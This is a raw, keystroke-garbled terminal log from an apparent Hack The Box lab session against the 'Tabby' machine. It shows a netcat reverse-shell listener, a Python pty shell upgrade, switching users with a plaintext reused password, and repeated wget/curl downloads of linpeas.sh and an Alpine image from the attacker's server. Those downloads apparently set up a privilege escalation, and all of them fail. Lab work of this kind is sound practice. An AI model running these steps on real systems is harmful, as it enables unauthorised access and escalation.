@@ -1,0 +1,108 @@
+Script started on 2020-09-10 13:12:06-05:00 [TERM="screen" TTY="/dev/pts/3" COLUMNS="87" LINES="48"]
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Tabby[00m$ nc -lvnp 90001[K[K1
+listening on [any] 9001 ...
+connect to [10.10.14.178] from (UNKNOWN) [10.10.10.194] 36600
+pyto hon3 -c 'impor  t py ty; [ pty.spawn("/bin/bash")'
+tomcat@tabby:/var/lib/tomcat9$ export TERM=xterm
+export TERM=xterm
+tomcat@tabby:/var/lib/tomcat9$ clear
+clear
+[H[2J[3Jtomcat@tabby:/var/lib/tomcat9$ cu    si u admin@it        ash
+su ash
+Password: ^B  admin@it
+
+]0;ash@tabby: /var/lib/tomcat9ash@tabby:/var/lib/tomcat9$ ls
+ls
+[0m[01;36mconf[0m  [01;34mlib[0m  [01;36mlogs[0m  [01;34mpolicy[0m  [01;34mwebapps[0m  [01;36mwork[0m
+]0;ash@tabby: /var/lib/tomcat9ash@tabby:/var/lib/tomcat9$ ccd /home
+ccd /home
+
+Command 'ccd' not found, did you mean:
+
+  command 'cdcd' from deb cdcd (0.6.6-13.1build2)
+  command 'ccr' from deb codecrypt (1.8-1build1)
+  command 'cct' from deb proj-bin (6.3.1-1)
+  command 'ccx' from deb calculix-ccx (2.11-1build3)
+  command 'mcd' from deb mtools (4.0.24-1)
+  command 'bcd' from deb bsdgames (2.17-28build1)
+  command 'hcd' from deb hfsutils (3.2.6-14)
+  command 'cc' from deb gcc (4:9.3.0-1ubuntu2)
+  command 'cc' from deb clang (1:10.0-50~exp1)
+  command 'cc' from deb pentium-builder (0.21ubuntu1)
+  command 'cc' from deb tcc (0.9.27-8)
+  command 'cccd' from deb cccd (0.3beta4-7.1build1)
+
+Try: apt install <deb name>
+
+]0;ash@tabby: /var/lib/tomcat9ash@tabby:/var/lib/tomcat9$ cd /ho	 ^[[C^[[C^[[C                 clear
+clear
+[H[2J[3J]0;ash@tabby: /var/lib/tomcat9ash@tabby:/var/lib/tomcat9$ cd    ls
+ls
+[0m[01;36mconf[0m  [01;34mlib[0m  [01;36mlogs[0m  [01;34mpolicy[0m  [01;34mwebapps[0m  [01;36mwork[0m
+]0;ash@tabby: /var/lib/tomcat9ash@tabby:/var/lib/tomcat9$ cd /g home
+cd /home
+]0;ash@tabby: /homeash@tabby:/home$ ls
+ls
+[0m[01;34mash[0m
+]0;ash@tabby: /homeash@tabby:/home$ locate .ssh
+locate .ssh
+/snap/core18/1705/lib/systemd/system/snapd.sshd-keygen.service
+/snap/core18/1705/lib/systemd/system/multi-user.target.wants/snapd.sshd-keygen.service
+]0;ash@tabby: /homeash@tabby:/home$ mkdir .ssj h
+mkdir .ssh
+mkdir: cannot create directory ‘.ssh’: Permission denied
+]0;ash@tabby: /homeash@tabby:/home$ sudo mkdir .ssh
+sudo mkdir .ssh
+sudo: unable to open /run/sudo/ts/ash: Read-only file system
+[sudo] password for ash: admin@it
+
+ash is not in the sudoers file.  This incident will be reported.
+]0;ash@tabby: /homeash@tabby:/home$ ^A^[[B      wget   10.10.14.178/ :9 800- 0/alpine-v3.12-x86_64-20200910_1316.tar.gz
+wget 10.10.14.178:8000/alpine-v3.12-x86_64-20200910_1316.tar.gz [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Kz
+--2020-09-10 18:37:06--  http://10.10.14.178:8000/alpine-v3.12-x86_64-20200910_1316.tar.gz
+Connecting to 10.10.14.178:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3228206 (3.1M) [application/gzip]
+alpine-v3.12-x86_64-20200910_1316.tar.gz: Permission denied
+
+Cannot write to ‘alpine-v3.12-x86_64-20200910_1316.tar.gz’ (Permission denied).
+]0;ash@tabby: /homeash@tabby:/home$ wgert  t 1-    alpine-v3.12-x86_64-20200910_1316.tar.gz                                        http://1- 0.10.10.  4.178:9 8000/alpine-v3.12-x86_64-20200910_1316.tar.gz
+wget http://10.10.14.178:8000/alpine-v3.12-x86_64-20200910_1316.tar.gz
+--2020-09-10 18:41:07--  http://10.10.14.178:8000/alpine-v3.12-x86_64-20200910_1316.tar.gz
+Connecting to 10.10.14.178:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3228206 (3.1M) [application/gzip]
+alpine-v3.12-x86_64-20200910_1316.tar.gz: Permission denied
+
+Cannot write to ‘alpine-v3.12-x86_64-20200910_1316.tar.gz’ (Permission denied).
+]0;ash@tabby: /homeash@tabby:/home$ ^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B                                    ^[[A^[[A^[[A            wget http://10.10.10.  4.178/linpeash .sh^[[D     h^[[D^[[D^[[D                       :8000/linpeash .sh
+wget http://10.10.14.178:8000/linpeas.sh
+--2020-09-10 18:42:03--  http://10.10.14.178:8000/linpeas.sh
+Connecting to 10.10.14.178:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 243613 (238K) [text/x-sh]
+linpeas.sh: Permission denied
+
+Cannot write to ‘linpeas.sh’ (Permission denied).
+]0;ash@tabby: /homeash@tabby:/home$ sudo wget 10.10.14.178/linpeas.sh^[[D                           http://10.10.10.  4.178/linp     :8000/linpeash .sh
+sudo wget http://10.10.14.178:8000/linpeas.sh
+sudo: unable to open /run/sudo/ts/ash: Read-only file system
+[sudo] password for ash: admin@it
+
+ash is not in the sudoers file.  This incident will be reported.
+]0;ash@tabby: /homeash@tabby:/home$ curl -o alpine-v3.12-x86_64-20200910_1316.tar.gz 10.10.10 4.178:9 8000/alpine-v3.12-x86_64-20200910_1316.tar.gz
+curl -o alpine-v3.12-x86_64-20200910_1316.tar.gz 10.10.14.178:8000/alpine-v3.12-x86_64-20200910_1316.tar.gz
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0Warning: Failed to create the file alpine-v3.12-x86_64-20200910_1316.tar.gz: 
+Warning: Permission denied
+  0 3152k    0  1345    0     0   3475      0  0:15:28 --:--:--  0:15:28  3475
+curl: (23) Failed writing body (0 != 1345)
+]0;ash@tabby: /homeash@tabby:/home$ nc -lvnp 4444
+nc -lvnp 4444
+Listening on 0.0.0.0 4444
+^C
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Tabby[00m$ exit
+exit
+
+Script done on 2020-09-10 13:28:17-05:00 [COMMAND_EXIT_CODE="1"]
